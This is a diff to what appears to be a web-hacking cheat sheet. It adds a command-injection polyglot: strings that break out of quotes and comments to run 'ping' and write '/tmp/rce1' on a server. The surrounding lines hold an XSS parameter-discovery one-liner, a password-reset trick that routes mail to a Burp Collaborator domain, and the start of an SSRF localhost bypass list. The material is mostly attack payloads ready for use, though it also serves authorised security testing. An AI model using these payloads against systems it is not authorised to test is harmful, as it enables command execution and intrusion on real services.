@@ -142,6 +142,11 @@ reset userpassword: user@email.com.burpcolaborator.com
 assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
 ```
 
+# Command injection polyglot
+```
+/*$(ping -c 2 example.com)`ping -c 2 example.com``*/-ping -c 2 example.com-'/*$(ping -c 2 example.com)`ping -c 2 example.com` #*/-ping -c 2 example.com||'"||ping -c 2 example.com||"/*`*/
+/*$(echo 1 >/tmp/rce1)`echo 1 >/tmp/rce1``*/-echo 1 >/tmp/rce1-'/*$(echo 1 >/tmp/rce1)`echo 1 >/tmp/rce1` #*/-echo 1 >/tmp/rce1||'"||echo 1 >/tmp/rce1||"/*`*/
+```
 # SSRF Bypass list for localhost (127.0.0.1):
 ```
 http://127.1/
